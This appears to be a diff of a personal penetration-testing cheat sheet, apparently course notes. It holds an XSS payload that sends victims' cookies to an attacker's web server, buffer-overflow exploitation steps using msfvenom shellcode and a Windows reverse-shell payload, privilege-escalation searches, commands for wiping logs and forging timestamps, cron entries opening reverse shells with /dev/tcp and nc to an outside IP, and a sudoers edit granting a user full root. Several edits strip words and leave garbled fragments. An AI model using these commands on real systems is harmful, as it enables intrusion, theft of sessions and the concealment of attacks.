@@ -21,13 +21,13 @@ ssh -S /tmp/t1 dummy -O forward -L5555:192.168.50.100:22
 ssh -MS /tmp/t2 credentials@127.0.0.1 -p 5555
 -------------------------------------------------------------------------------------------------------------------------
 
-nmap --script=http-enum.nse <ip address>
+nmap --=http-enum.nse <ip address>
     if you see robots.txt, go to it in url
 <ip address>/robots.txt
 
 create web server on yourself and download cookies
 	python3 -m http.server
-	<script>document.location="http://10.50.38.49:8000/"+document.cookie;</script>
+	<>document.location="http://10.50.38.49:8000/"+document.cookie;</>
 
 uploading ssh to web server
 
@@ -170,7 +170,7 @@ gdb <./executable>
 	get executable into debugger
 
 run <<<$(echo "hello")
-	redirects hello into script
+	redirects hello into 
 
 pdisass main
 	disassembles main function
@@ -183,10 +183,10 @@ find function thats red (has vulerability)
 run <<<$(python buffer.py)
 wiremask.eu
 
-paste long thing into script, run script
+paste long thing into , run 
 	EIP value into registervalue on wiremask.eu to get offset (buffer size)
 
-change script to found offset value
+change  to found offset value
 add eip variable set to 4 new characters ("BBBB")
 run it
 
@@ -209,7 +209,7 @@ make note of last address of stack
 find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4			0xff is jmp 0xe4 is esp
  (first after heap) (last of stack)
 
-grab 4 of the addresses and paste them in script, comment them out
+grab 4 of the addresses and paste them in , comment them out
 break them down into their individual bytes
 flip them around
 	#0xf7de2b59 = 0xf7 de 2b 59 = \x59\x2b\xde\xf7
@@ -217,7 +217,7 @@ copy paste conversion into eip variable
 
 run this in new terminal
 	msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
-copy paste shell code into python script
+copy paste shell code into python 
 	everything that starts with buf
 create nop variable
 	nop = "\x90" * 15
@@ -243,7 +243,7 @@ create payload using msfvenom again
 	msfvenom -p windows/shell/reverse_tcp lhost=10.50.38.49 lport=8888 -b "\x00" -f python
 	lhost is your linux opstation
 copy everything other than buf = "" line
-paste payload in python script
+paste payload in python 
 msfconsole
 use multi/handler
 show options
@@ -325,6 +325,88 @@ find / -type f -perm /2000 -ls 2>/dev/null
 	finds SGID only files
 find / -type f -perm /6000 -ls 2>/dev/null
 	finds both SGID and SUID files
+
+crontab 
+	crontab -l       lists
+	crontab -e 	 edit
+	crontab -r	 remove
+	crontab -u <user> -l		lists crontabs for a specific user
+
+	/var/spool/cron/crontabs
+		user level crontabs
+	/etc/crontab
+		system level crontabs
+
+world writable files and folders
+	/tmp
+	/var/tmp
+
+find / type -d -perm /2 -ls 2>/dev/null
+	finds directories that are world writable
+
+. in the path
+	PATH=.:$PATH
+		adds . to the front of your path statement
+
+file /var/log/wtmp
+find /var/log -type f -mmin -10
+journalctl -f -u ssh
+
+clearing the logs
+
+	rm -rf /var/log/...			get rid of the file
+
+	cat /dev/null > /var/log/...		clear it
+	echo > /var/log/...
+
+change timestamps
+	touch -r file.txt file1.txt 		references file.txt for time and makes file1.txt the same (file1.txt being the one you want to change)
+
+remote logging
+	check config file
+		/etc/rsyslog.conf
+		grep "IncludeConfig" /etc/rsyslog.conf
+		<facility>.<priority>
+
+sudo -l -> GTFObin.github.io
+
+
+nice /bin.sh
+
+
+* * * * * /bin/bash -i >& /dev/tcp/192.168.28.135/33403  
+* * * * * /bin/echo "test works" >> /tmp/crontest
+1 * * * * nc 192.168.28.135 33403 -e /bin/bash
+
+
+/var/tmp/testbed/unknown /etc/sudoers 'comrade ALL=(ALL:ALL) ALL'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
